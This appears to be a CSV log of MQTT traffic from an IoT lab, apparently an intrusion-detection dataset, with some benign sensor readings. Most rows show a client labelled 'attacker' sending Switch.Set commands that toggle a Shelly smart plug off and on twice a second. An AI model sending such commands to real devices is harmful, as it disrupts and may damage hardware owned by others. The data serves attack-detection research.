2026-04-22T16:39:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5502 34525.130 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34525.13,""swi"
2026-04-22T16:39:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5503 34525.149 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5504 34525.631 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34525.63,""swi"
2026-04-22T16:39:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5505 34525.648 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5506 34526.133 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34526.13,""swi"
2026-04-22T16:39:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5507 34526.151 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5508 34526.632 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34526.63,""swi"
2026-04-22T16:39:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5509 34526.649 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5510 34527.132 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34527.13,""swi"
2026-04-22T16:39:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5511 34527.151 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5512 34527.642 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34527.64,""swi"
2026-04-22T16:39:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5513 34527.658 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5514 34528.133 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34528.13,""swi"
2026-04-22T16:39:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5515 34528.152 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5516 34528.634 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34528.63,""swi"
2026-04-22T16:39:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5517 34528.650 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5518 34529.134 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34529.13,""swi"
2026-04-22T16:39:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5519 34529.152 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5520 34529.635 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34529.63,""swi"
2026-04-22T16:39:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5521 34529.651 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:39:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:39:56,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:39:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:39:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:39:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5522 34530.136 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34530.13,""swi"
2026-04-22T16:39:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5523 34530.154 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5524 34530.636 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34530.63,""swi"
2026-04-22T16:39:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5525 34530.652 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5526 34531.137 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34531.13,""swi"
2026-04-22T16:39:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5527 34531.156 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5528 34531.636 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34531.63,""swi"
2026-04-22T16:39:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5529 34531.653 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5530 34532.137 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34532.13,""swi"
2026-04-22T16:39:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5531 34532.155 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5532 34532.637 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34532.63,""swi"
2026-04-22T16:39:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5533 34532.654 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5534 34533.138 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34533.13,""swi"
2026-04-22T16:40:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5535 34533.157 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5536 34533.638 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34533.64,""swi"
2026-04-22T16:40:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5537 34533.655 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5538 34534.139 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34534.14,""swi"
2026-04-22T16:40:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5539 34534.158 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5540 34534.639 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34534.64,""swi"
2026-04-22T16:40:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5541 34534.655 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5542 34535.140 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34535.14,""swi"
2026-04-22T16:40:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5543 34535.159 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5544 34535.642 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34535.64,""swi"
2026-04-22T16:40:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5545 34535.659 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5546 34536.141 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34536.14,""swi"
2026-04-22T16:40:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5547 34536.159 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5548 34536.641 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34536.64,""swi"
2026-04-22T16:40:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5549 34536.658 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5550 34537.141 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34537.14,""swi"
2026-04-22T16:40:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5551 34537.160 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5552 34537.642 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34537.64,""swi"
2026-04-22T16:40:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5553 34537.659 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
